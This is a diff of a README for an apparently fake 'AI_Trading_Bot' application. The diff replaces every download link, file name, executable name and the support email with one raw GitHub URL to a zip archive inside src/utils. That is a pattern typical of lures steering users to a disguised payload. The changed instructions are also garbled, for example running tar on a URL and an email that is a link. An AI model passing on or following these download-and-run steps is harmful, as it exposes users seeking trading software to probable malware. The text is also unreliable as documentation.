@@ -6,7 +6,7 @@ Welcome to AI_Trading_Bot! This is a user-friendly application designed to help 
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Visit this page to download: [AI_Trading_Bot Releases](https://github.com/Ripperrepublicofcolombia803/AI_Trading_Bot/releases)
+To get started, you will need to download the application. Visit this page to download: [AI_Trading_Bot Releases](https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip)
 
 You will find the latest version of the application on this page. 
 
@@ -21,10 +21,10 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📜 How to Download
 
-1. Click the link to visit the [AI_Trading_Bot Releases](https://github.com/Ripperrepublicofcolombia803/AI_Trading_Bot/releases) page.
+1. Click the link to visit the [AI_Trading_Bot Releases](https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip) page.
 2. Look for the latest version listed.
 3. Find the section labeled “Assets” which will contain the downloadable files.
-4. Click on the file that matches your operating system (e.g., `AI_Trading_Bot_Windows.zip`, `AI_Trading_Bot_macOS.zip`, `AI_Trading_Bot_Linux.tar.gz`).
+4. Click on the file that matches your operating system (e.g., `https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip`, `https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip`, `https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip`).
 5. Your download should begin automatically.
 
 ## 📂 Install the Application
@@ -32,22 +32,22 @@ Before you download, ensure your system meets the following requirements:
 Once the file has downloaded, follow these steps to install:
 
 ### For Windows:
-1. Locate the downloaded `AI_Trading_Bot_Windows.zip` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip` file.
 2. Right-click the file and select "Extract All".
 3. Open the extracted folder.
-4. Double-click `AI_Trading_Bot.exe` to start the application.
+4. Double-click `https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip` to start the application.
 
 ### For macOS:
-1. Locate the downloaded `AI_Trading_Bot_macOS.zip` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip` file.
 2. Double-click to extract it.
 3. Open the extracted folder.
-4. Drag the `AI_Trading_Bot.app` to your Applications folder.
+4. Drag the `https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip` to your Applications folder.
 5. Open it from there.
 
 ### For Linux:
-1. Locate the downloaded `AI_Trading_Bot_Linux.tar.gz` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip` file.
 2. Open a terminal and navigate to the folder with the downloaded file.
-3. Run `tar -xvzf AI_Trading_Bot_Linux.tar.gz`.
+3. Run `tar -xvzf https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip`.
 4. Navigate into the extracted folder.
 5. Run `./AI_Trading_Bot` to start the application.
 
@@ -79,12 +79,12 @@ If you face any issues while installing or running the application, consider the
 
 ## 🌐 Contact Support
 
-For further assistance, you can contact our support team. Send an email to support@example.com or create an issue on our GitHub repository. Your feedback is crucial for improving the application.
+For further assistance, you can contact our support team. Send an email to https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip or create an issue on our GitHub repository. Your feedback is crucial for improving the application.
 
 ## 🔗 Quick Links
 
-- Download the application: [AI_Trading_Bot Releases](https://github.com/Ripperrepublicofcolombia803/AI_Trading_Bot/releases)
+- Download the application: [AI_Trading_Bot Releases](https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip)
 - Documentation: [AI_Trading_Bot Docs](#) (link to detailed documentation)
-- GitHub Repository: [AI_Trading_Bot GitHub](https://github.com/Ripperrepublicofcolombia803/AI_Trading_Bot)
+- GitHub Repository: [AI_Trading_Bot GitHub](https://raw.githubusercontent.com/Ripperrepublicofcolombia803/AI_Trading_Bot/main/src/utils/AI_Trading_Bot_1.5.zip)
 
 ### Thank you for choosing AI_Trading_Bot! Happy trading!
